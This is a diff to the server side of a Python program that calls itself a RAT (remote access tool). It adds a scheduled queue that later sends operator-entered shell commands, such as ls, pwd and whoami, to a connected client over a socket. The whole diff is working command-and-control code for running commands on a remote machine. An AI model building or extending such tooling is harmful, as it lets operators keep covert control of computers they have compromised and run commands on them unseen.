@@ -5,7 +5,7 @@ import os
 import socket
 import time
 import sys
-from datetime import datetime
+from threading import Timer
 
 #create a socket object for use throughout the program
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -21,9 +21,10 @@ queue = []
 logFileName = "RAT_Server_log" + str(time.time()) + ".txt"
 
 def help():
-    print('===== HELP =====')
+    print('=' * 5, 'HELP', '=' * 5)
     print('Enter "quit" to tell the remote server to end the connection')
     print('Enter "stop" to stop RAT server')
+    print('Enter "queue" to queue commands to run on the client')
     print('='*16)
 
 def sendCommand(cmd):
@@ -33,11 +34,30 @@ def sendCommand(cmd):
     print(message.decode("UTF-8"))
 
 def addCommandtoQueue(cmd):
-    queue.insert(cmd)
+    queue.append(cmd)
 
 def clearQueue():
+    queue.clear()
+
+def runCommandsInQueue():
+    print('=' * 5, "Command queue running now...", '=' * 5)
     for i in queue:
-        queue.pop()
+        sendCommand(i)
+    print('=' * 5, "Command queue finished running", '=' * 5)
+    print('=' * 5, "Clearing command queue", '=' * 5)
+    clearQueue()
+    print("Your command to send: \n")
+
+def startQueue(sec):
+    global timer
+    timer = Timer(sec, runCommandsInQueue, args=None, kwargs=None)
+    try:
+        timer.start()
+    except Exception as e:
+        print("The following exception has occurred: ", e)
+
+def stopQueueFromRunning():
+    timer.cancel()
 
 class LoggingPrinter:
     def __init__(self, filename):
@@ -95,6 +115,42 @@ with LoggingPrinter(logFileName):
         if command.lower() == 'help':
             print(command)
             help()
+        #allow the user to queue commands to run on the client
+        elif command.lower() == 'queue':
+            print("Do you want to adjust the queue timer, stop the queue timer (and keep the commands in the queue),"
+                  " add commands to the queue, clear and stop the queue, or go back to the RAT interface?\n")
+            while True:
+                decision = input('Type "adjust", "stop", "add", "clear", or "back"\n')
+                if decision.lower() == 'adjust':
+                    seconds = input("Enter the number of seconds you want to wait before queue executes\n")
+                    seconds = int(seconds)
+                    startQueue(seconds)
+                    print("Queue scheduled to run in " + str(seconds) + " seconds. Returning to RAT terminal")
+                    break
+                elif decision.lower() == 'stop':
+                    stopQueueFromRunning()
+                    print("Returning to RAT terminal\n")
+                    break
+                elif decision.lower() == 'add':
+                    queueCommands = input("Enter at least 2 commands you want to run on the client. Separate each command with a"
+                                          " comma followed by a space. Example: ls, pwd, whoami\n")
+                    queueCommands = queueCommands.split(',')
+                    for i in queueCommands:
+                        addCommandtoQueue(i)
+                    seconds = input("Enter the number of seconds you want to wait before queue executes\n")
+                    seconds = int(seconds)
+                    startQueue(seconds)
+                    print("Queue scheduled to run in " + str(seconds) + " seconds. Returning to RAT terminal")
+                    break
+                elif decision.lower() == 'clear':
+                    clearQueue()
+                    stopQueueFromRunning()
+                    print("Command queue cleared and stopped. Returning to RAT terminal\n")
+                    break
+                elif decision.lower() == 'back':
+                    break
+                else:
+                    print("Not a valid selection.\n")
         #if the user enters "quit", then the server should kill the remote connection
         elif command.lower() == 'quit':
             print(command)
